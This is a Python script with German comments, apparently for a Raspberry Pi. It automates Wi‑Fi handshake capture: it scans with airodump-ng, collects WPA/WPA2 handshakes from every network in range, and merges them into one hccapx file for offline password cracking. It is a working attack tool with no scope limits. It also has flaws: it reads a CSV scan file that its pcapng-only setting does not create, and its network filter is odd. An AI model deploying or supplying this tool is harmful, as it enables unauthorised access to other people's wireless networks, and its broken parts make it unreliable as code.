import os
import subprocess
import time
import glob

INTERFACE = "wlan1"
HANDSHAKE_DIR = "/home/pi/handshakes"
SCAN_TIME = 60  # Zeit für Netzwerkscan in Sekunden
HANDSHAKE_WAIT_TIME = 60  # Zeit für Handshake-Erfassung pro Netzwerk

def setup():
    # Handshake-Verzeichnis erstellen, falls es nicht existiert
    os.makedirs(HANDSHAKE_DIR, exist_ok=True)

def scan_networks():
    print("[*] Starte Netzwerkscan...")
    scan_process = subprocess.Popen(
        ["sudo", "airodump-ng", "--band", "abg", "-w", HANDSHAKE_DIR + "/scan", "--output-format", "pcapng", INTERFACE],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(SCAN_TIME)
    scan_process.terminate()
    return HANDSHAKE_DIR + "/scan-01.csv"

def parse_networks(scan_file):
    networks = []
    with open(scan_file, "r", encoding='ISO-8859-1') as f:  # Verwendung von ISO-8859-1 Encoding
        for line in f:
            if "WPA" in line and "WPA2" in line:
                fields = line.split(',')
                if len(fields) > 1:
                    bssid = fields[0].strip()
                    channel = fields[3].strip()
                    networks.append((bssid, channel))
    print(f"[*] {len(networks)} Netzwerke gefunden.")
    return networks

def capture_handshake(bssid, channel):
    print(f"[*] Erfasse Handshake für {bssid} auf Kanal {channel}...")
    airodump_cmd = [
        "sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w",
        f"{HANDSHAKE_DIR}/{bssid}", INTERFACE
    ]
    airodump_process = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(HANDSHAKE_WAIT_TIME)
    airodump_process.terminate()

def convert_and_cleanup():
    print("[*] Konvertiere und bereinige Dateien...")
    cap_files = glob.glob(f"{HANDSHAKE_DIR}/*.pcapng")
    if not cap_files:
        print("[!] Keine .pcapng-Dateien gefunden.")
        return
    # Erstelle eine einzige .hccapx Datei aus allen .pcapng Dateien
    hccapx_file = os.path.join(HANDSHAKE_DIR, "handshake.hccapx")
    conversion_cmd = ["hcxpcapngtool", "-o", hccapx_file] + cap_files
    subprocess.call(conversion_cmd)
    print(f"[*] Handshake-Datei erstellt: {hccapx_file}")
    # Lösche alle .pcapng-Dateien nach der Konvertierung
    for cap_file in cap_files:
        os.remove(cap_file)
    print("[*] Alle .pcapng-Dateien wurden gelöscht.")

def main():
    setup()
    scan_file = scan_networks()
    networks = parse_networks(scan_file)
    for bssid, channel in networks:
        capture_handshake(bssid, channel)
    convert_and_cleanup()

if __name__ == "__main__":
    main()
